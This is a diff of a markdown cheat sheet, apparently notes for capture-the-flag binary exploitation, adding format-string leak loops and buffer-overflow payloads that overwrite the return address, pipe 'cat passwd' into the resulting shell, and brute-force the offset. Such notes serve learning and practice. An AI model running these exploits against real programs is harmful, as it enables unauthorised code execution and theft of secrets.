@@ -18,21 +18,20 @@ seo:
 ---
 ## Format string
 
-Leaking address:
+- Leaking address:
 
 ```sh
 for i in $(seq 1 20); do ./ch5 %$i\$x;printf "\n";done
 ```
 
-Show the content : 
+- Show the content : 
 ```sh
 for i in $(seq 1 20); do ./ch5 %$i\$x |rax2 -s |tr -cd "[:print:]" |rev;printf "\n";done
 ```
 
-
 ## Buffer Overflow 
 
-Find the Offset :
+- Find the Offset :
 
 ```sh
 pwn cyclic 150
@@ -45,12 +44,25 @@ gdb-peda$ pattern_offset A7AAMAAiA
 `In 32 bits take the bytes that overflowed RIP ` 
 `In 64 bits Grab the first P bytes of RSP`
 
-Overflow RIP (64bits) :
+- Overflow RIP ( 32bits ) :
 
 ```sh
-python3 -c "print('\x41'*280 + '\x41\x41\x41\x41\x41\x41\x00\x00')" |tr -d "\n" > in.bin
-gdb-peda$ r < in.bin
+(python3 -c "print('\x41' * $i + '\x56\x11\x40\x00\x00\x00\x00\x00')";echo "cat passwd" ; cat) | ./ch35 
 ```
 
-##  Heap Overflow
+- Overflow RIP ( 64bits ) :
+
+```sh
+(python3 -c "print('\x41' * $i + '\x41\x41\x41\x41')"; cat) | ./ch35 
+```
+
+- Brute Force Offset : 
+```sh
+for i in $(seq 250 300); do
+
+(python3 -c "print('\x41' * $i + '\x56\x11\x40\x00\x00\x00\x00\x00')";echo "cat passwd" ; cat) | ./ch35; 
+
+done
+```
+
 
